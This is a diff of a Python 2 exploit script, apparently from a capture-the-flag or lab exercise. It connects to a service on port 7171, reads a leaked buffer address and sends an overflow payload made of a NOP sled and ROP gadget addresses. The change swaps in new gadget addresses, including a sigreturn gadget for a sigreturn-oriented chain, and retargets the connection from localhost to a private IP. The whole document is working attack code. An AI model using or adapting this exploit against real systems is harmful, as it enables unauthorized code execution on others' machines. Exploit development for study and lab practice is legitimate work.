@@ -1,9 +1,10 @@
 from socket import create_connection
 import struct
 
-XOR_RAX_RAX = 0x000000000043241f # xor rax,rax ; ret
-SYSCALL     = 0x000000000040168a # syscall
-SYSCALL_RET = 0x0000000000446e85 # syscall ; ret
+XOR_RAX_RAX   = 0x00000000004323df # xor rax,rax ; ret
+SYSCALL       = 0x000000000040168a # syscall
+SYSCALL_RET   = 0x000000000040116f # syscall ; ret
+SIGRETURN_IND = 0x0000000000401168 # mov rax, 15; syscall; ret
 
 def recv_n_bytes(sock, n):
     c = 0
@@ -13,7 +14,7 @@ def recv_n_bytes(sock, n):
         c += 1
     return data
 
-s = create_connection(("localhost", 7171))
+s = create_connection(("10.30.56.126", 7171))
 buffer_address = recv_n_bytes(s, 8)
 print repr(buffer_address)
 buffer_address = struct.unpack("<Q", buffer_address)[0]
@@ -27,5 +28,6 @@ print hex(page)
 sploit  = "\x90" * 0x200
 sploit += "B" * 8
 sploit += struct.pack("<Q", XOR_RAX_RAX)
-sploit += struct.pack("<Q", SYSCALL_RET)
+sploit += struct.pack("<Q", SIGRETURN_IND)
+sploit += "Z" * 200
 s.send(sploit)
